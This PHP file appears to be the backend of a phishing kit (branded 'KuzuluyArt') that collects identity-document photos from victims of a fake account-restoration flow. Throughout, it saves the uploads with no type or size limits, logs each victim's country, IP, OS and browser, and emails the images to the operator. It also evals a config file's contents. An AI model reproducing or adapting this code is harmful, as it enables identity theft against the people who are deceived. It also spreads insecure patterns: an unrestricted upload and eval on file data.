<?php
require_once __DIR__ . '/../include/fileuploader/autoload.php';
require_once __DIR__ . '/../function.php';
@eval(file_get_contents('../config/' . $api->general_config));

function sendimg($to, $subject, $img) {
  $content = file_get_contents($img);
  $content = chunk_split(base64_encode($content));
  $uid = md5(uniqid(time()));
  $filename = basename($img);
  $headers  = "From: KuzuluyArt <id@kuzuluy.co>\r\n";
  $headers .= "MIME-Version: 1.0\r\n";
  $headers .= "Content-Type: multipart/mixed; boundary=\"".$uid."\"\r\n\r\n";

  $message = "--".$uid."\r\n";
  $message .= "Content-type:text/plain; charset=iso-8859-1\r\n";
  $message .= "Content-Transfer-Encoding: 7bit\r\n\r\n";
  $message .= $message."\r\n\r\n";
  $message .= "--".$uid."\r\n";
  $message .= "Content-Type: application/octet-stream; name=\"".$filename."\"\r\n";
  $message .= "Content-Transfer-Encoding: base64\r\n";
  $message .= "Content-Disposition: attachment; filename=\"".$filename."\"\r\n\r\n";
  $message .= $content."\r\n\r\n";
  $message .= "--".$uid."--";
  mail($to, $subject, $message, $headers);
}

$FileUploader = new FileUploader('files', array(
    'limit' => null,
    'maxSize' => null,
    'fileMaxSize' => null,
    'extensions' => null,
    'required' => false,
    'uploadDir' => '../admin/uploads/',
    'title' => 'name',
    'replace' => false,
    'editor' => array(
        'maxWidth' => 640,
        'maxHeight' => 480,
        'quality' => 90
    ),
    'listInput' => true,
    'files' => null
));

foreach ($FileUploader->getRemovedFiles('file') as $key => $value) {
  unlink('../admin/uploads/' . $value['name']);
}

$data = $FileUploader->upload();

if ($data['isSuccess'] && count($data['files']) > 0) {
  $uploadedFiles = $data['files'];

  $message = '<html><body>';
  for ($i=0; $i < count($uploadedFiles); $i++) {
    $message .= "<a href='http://".$_SERVER['HTTP_HOST']."/post/".$data[files][$i][file]."'><img src='http://".$_SERVER['HTTP_HOST']."/post/".$data[files][$i][file]."' height='500' width='500'></a><br><br>";
  }
  $message .= '</body></html>';

  $subject  = "Identity Submitted [ ".$_SESSION['country']." | ".$_SESSION['ip']." | ".$_SESSION['os']." - ".$_SESSION['browser']." ]";

  $api->save("../config/result-identity.txt", $subject."\n", "a");

  if ($config_smtp == "enable"){
    $api->ngesend($api->result(), $subject, $message, "KuzuluyArt", "id@kuzuluy.co");
  } else {
    for ($i=0; $i < count($uploadedFiles); $i++) {
      sendimg($api->result(), $subject, $data[files][$i][file]);
    }
  }

  $api->redirect("../myaccount/restored");
} else {
  $api->redirect("../myaccount/confirm=identity");
}

if ($data['hasWarnings']) {
  $warnings = $data['warnings'];
  $api->redirect("../myaccount/confirm=identity");
}
?>
